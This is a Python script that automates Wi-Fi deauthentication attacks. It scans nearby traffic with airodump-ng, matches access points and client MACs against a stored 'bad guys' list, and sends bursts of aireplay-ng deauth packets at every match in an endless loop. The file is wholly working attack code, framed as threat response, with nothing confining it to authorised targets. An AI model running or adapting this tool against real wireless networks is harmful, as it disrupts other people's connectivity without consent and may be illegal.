#!/usr/bin/python3
import os
import csv
import time
import os.path


def killairodump():	
	print("Kill running process")
	os.system("ps aux | pgrep airodump > /root/Desktop/lspy/kilproc.csv")	#REDIRECT AIRODUMP PROCESS ID TO KILPROC.CSV
	time.sleep(.5)								#SLEEP FOR .5 SECONDS TO ALLOW KILPROC.CSV TO POPULATE
	with open("/root/Desktop/lspy/kilproc.csv", "r") as kill_pid:		#OPEN KILPROC.CSV FOR READING
		reader = csv.reader(kill_pid)					
		kill_pid = list(reader)						#ASSIGN CONTENTS OF KILPROC.CSV TO KILL_PID (PROCESS ID)
		if len(kill_pid) > 0:						#IF LENGTH OF KILL_PID GREATER THAN ZERO...
			os.system("kill {}".format(kill_pid[0][0]))		#KILL PROCESS ID


def deauth(b, s, c):	#B = BSSID, S = STATION, C = CHANNEL
	killairodump()											#STOP GENERAL AIRODUMP TO START THE CHANNEL AIRODUMP
	os.system("tmux new -d")									#CREATE A NEW TMUX BACKGROUND TERMINAL
	os.system("tmux send -Rt 0 airodump-ng SPACE wlan0mon SPACE -c SPACE {} ENTER".format(c))	#RUN AIRODUMP-NG ON THE PROPER CHANNEL
	time.sleep(1)											#SLEEP FOR 1 SECOND TO PREVENT PREMATURE AIREPLAY 
	os.system("aireplay-ng wlan0mon -0 20 -a {} -c {}".format(b, s)) 				#RUN AIREPLAY FOR 20 DEAUTHORIZATION PACKETS
	killairodump()											#STOP CHANNEL AIRODUMP TO PREVENT CONFLICTING AIRODUMP PROCESSES
	startloop()

def startloop():
	print("Starting loop")
	if os.path.isfile("/root/Desktop/lspy/newlist-01.csv"):		#IF NEWLIST-01 EXISTS...
		os.system("rm /root/Desktop/lspy/newlist-01.csv")	#REMOVE IT...
		os.system("tmux new -d")				#START A NEW TMUX BACKGROUND TERMINAL AND START AIRODUMP ON ALL CHANNELS
		os.system("tmux send -Rt 0 airodump-ng SPACE wlan0mon SPACE -w SPACE /root/Desktop/lspy/newlist SPACE --output-format SPACE csv ENTER")
	else:								#ELSE...
		os.system("tmux new -d")				#START A NEW TMUX BACKGROUND TERMINAL AND START AIRODUMP ON ALL CHANNELS
		os.system("tmux send -Rt 0 airodump-ng SPACE wlan0mon SPACE -w SPACE /root/Desktop/lspy/newlist SPACE --output-format SPACE csv ENTER")
	time.sleep(5) 							#WAIT 5 SECONDS FOR NEWLIST TO POPULATE
	findthreat()							#AND RUN FINDTHREAT FUNCTION
	
matchthreat = False
def findthreat():
	counter = 0
	while counter <= 5:		
		print("Find threat number... ", counter)
		with open('/root/Desktop/lspy/badguys2.csv') as bfile:		#OPEN BADGUYS2.CSV AS BFILE
			reader = csv.reader(bfile)				#ASSIGN BFILE TO READER
			blist = list(reader)					#ASSIGN READER TO BLIST
			bfile.close()						#CLOSE BFILE
			for threat in blist:					#FOR EVERY THREAT IN BLIST... 
				threat = threat[0]						
				print("Testing New_list for threat MAC", threat)		#PRINT "TESTING FOR THREAT..." MESSAGE
				with open('/root/Desktop/lspy/newlist-01.csv') as nfile: 	#AND OPEN NEWLIST-01	
					reader = csv.reader(nfile)
					newlist = list(reader)					
					nfile.close()
					for row in newlist:						#FOR EACH ROW IN THE NEWLIST...					
						if len(row) == 7:					#IF THE LENGTH OF THE ROW IS 7 (THEN IT'S A ROW WITH AN ASSOCIATED STATION)...
							station = row[0]				#ASSIGN THE STATION MAC TO "STATION" 			
							bsid = row[5].strip(" ")			#AND ASSIGN THE BSSID TO "BSID"
							if bsid == threat:					#IF BSID == THREAT...
								for chan_row in newlist:				#FOR EACH ROW IN NEWLIST
									if len(chan_row)==15:					#IF THE ROW LENGTH IS 15 (THEN IT'S A ROW WITH A CHANNEL)
										bssid_target = chan_row[0]			#ASSIGN THE FIRST ELEMENT OF THE ROW TO BSSID_TARGET 
										if bssid_target == bsid:			#AND IF BSSID_TARGET == BSID...
											ch = chan_row[3]				#ASSIGN THE 4TH ELEMENT OF THE ROW AS BSID'S CHAN, "CH"
										if bssid_target == station:			#IF THE BSSID_TARGET == STATION...
											ch = chan_row[3]				#ASSIGN THE 4TH ELEMENT OF THE ROW AS BSID'S CHAN, "CH"
								print("\nMatched BSSID {} to Threat {}".format(bsid, threat))	#DISPLAY A MESSAGE THAT NEWLIST BSSID MATCHES BADGUY THREAT 
								print("Associated Station: ", station)				#AND DISPLAY THE ASSOCIATED STATION...
								print("Channel: ", ch)						#AND THE ASSOCIATED CHANNEL...
								deauth(bsid, station, ch)					#AND PASS BSSID, STATION & CH TO DEAUTHORIZE()
								break
								
							if station ==  threat:				#SAME AS ABOVE EXCEPT AIRMON IS INTERPRETING THE THREAT AS A STATION VS A BSSID.
								for chan_row in newlist:
									if len(chan_row)==15:
										bssid_target = chan_row[0]
										if bssid_target == bsid:
											ch = chan_row[3]
										if bssid_target == station:
											ch = chan_row[3]
								print("\nMatched Station {} to Threat {}".format(station, threat))
								print("Associated BSSID: ", bsid)
								print("Channel: ", ch)
								deauth(bsid, station, ch)
								break
							else:
								print("No threats detected...")	#IF BADGUY THREAT NOT IN NEWLIST
								killairodump()			#KILL AIRODUMP
								counter += 1			#INCREMENT COUNTER
								time.sleep(1)			#WAIT 1 SECOND & GO THROUGH WHILE LOOP AGAIN (UNTIL COUNTER IS OVER 5)
								if counter == 5:
									startloop()


startloop()
	
	
